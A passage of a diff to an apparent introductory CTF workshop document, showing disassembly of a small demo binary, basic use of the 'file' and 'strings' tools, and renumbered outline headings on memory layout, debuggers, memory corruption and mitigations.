+  4005ae:       48 c7 45 f8 8d 06 40    movq   $0x40068d,-0x8(%rbp)
+  4005b5:       00
+  4005b6:       48 8b 55 f8             mov    -0x8(%rbp),%rdx
+  4005ba:       48 8b 45 f0             mov    -0x10(%rbp),%rax
+  4005be:       48 89 d6                mov    %rdx,%rsi
+  4005c1:       48 89 c7                mov    %rax,%rdi
+  4005c4:       e8 87 fe ff ff          callq  400450 <strcmp@plt>
+  4005c9:       85 c0                   test   %eax,%eax
+  4005cb:       75 11                   jne    4005de <say_hello+0x40>
+  4005cd:       48 8b 45 f0             mov    -0x10(%rbp),%rax
+  4005d1:       48 89 c7                mov    %rax,%rdi
+  4005d4:       b8 00 00 00 00          mov    $0x0,%eax
+  4005d9:       e8 52 fe ff ff          callq  400430 <printf@plt>
+  4005de:       48 8b 45 f8             mov    -0x8(%rbp),%rax
+  4005e2:       48 89 c7                mov    %rax,%rdi
+  4005e5:       b8 00 00 00 00          mov    $0x0,%eax
+  4005ea:       e8 41 fe ff ff          callq  400430 <printf@plt>
+  4005ef:       90                      nop
+  4005f0:       c9                      leaveq
+  4005f1:       c3                      retq
+  4005f2:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
+  4005f9:       00 00 00
+  4005fc:       0f 1f 40 00             nopl   0x0(%rax)
+
+... application boilerplate snipped away ...
+elliot@ctf101-shell:~/ctf101$
+```
+
+#### file
+
+Amazing tool to guess a file's filetype.
+
+```console
+elliot@ctf101-shell:~/ctf101$ file demotools
+demotools: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically
+linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32,
+BuildID[sha1]=ae2e06fe46509a8713c6e51b38649910afc993e9, not stripped
+elliot@ctf101-shell:~/ctf101$
+```
+
+#### strings
+
+Another basic tool that you should always use to get a better idea of what you
+are looking at. Don't run it vanilla on [untrusted binaries
+though](http://lcamtuf.blogspot.sg/2014/10/psa-dont-run-strings-on-untrusted-files.html).
+
+```console
+elliot@ctf101-shell:~/ctf101$ strings demotools
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+printf
+strcmp
+__libc_start_main
+__gmon_start__
+GLIBC_2.2.5
+UH-@
+AWAVA
+AUATL
+[]A\A]A^A_
+Goaway!
+Helloo!
+;*3$"
+GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.2) 5.4.0 20160609
+crtstuff.c
+__JCR_LIST__
+deregister_tm_clones
+__do_global_dtors_aux
+completed.7585
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+demotools.c
+__FRAME_END__
+__JCR_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+_edata
+printf@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+strcmp@@GLIBC_2.2.5
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+say_hello
+_Jv_RegisterClasses
+__TMC_END__
+_ITM_registerTMCloneTable
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.jcr
+.dynamic
+.got.plt
+.data
+.bss
+.comment
+elliot@ctf101-shell:~/ctf101$
+```
+
+### Reading x86-64 assembly
+
+## 7. Memory Layout
 
 - Stack and Heap
 - Variables - stack variables, dynamically allocated variables and static
   variables
 
-## 9. Stack Frames
+## 8. Stack Frames
 
 - Saved RIP
 - Saved EBP
 
-## 10. Calling Conventions
-
-- stcall
-- cdecl
-- fastcall
-
-## 11 Debuggers
+## 9. Debuggers
 
 - GDB
 - Inputs
@@ -2116,23 +2565,23 @@ Consider the simplest
 - Examining and modifying context
 - Crash Analysis
 
-## 12. Memory Corruption Vulnerabilities
+## 10. Memory Corruption Vulnerabilities
 
 
-## 13. Other Vulnerabilities
+## 11. Other Vulnerabilities
 
 - Format string bugs
 - Insecure paths
 - Integer overflows
 - Predictive randomisation
 
-## 14. Mitigations and Bypasses
+## 12. Mitigations and Bypasses
 
 - Stack Canaries
 - ASLR
 - NX
 
-## 15. Conclusion and Additional Challenges
+## 13. Conclusion and Additional Challenges
 
 This section brings the workshop to an end. We hope it was adequate in giving
 you an introduction to the topics we covered and have sparked an interest in
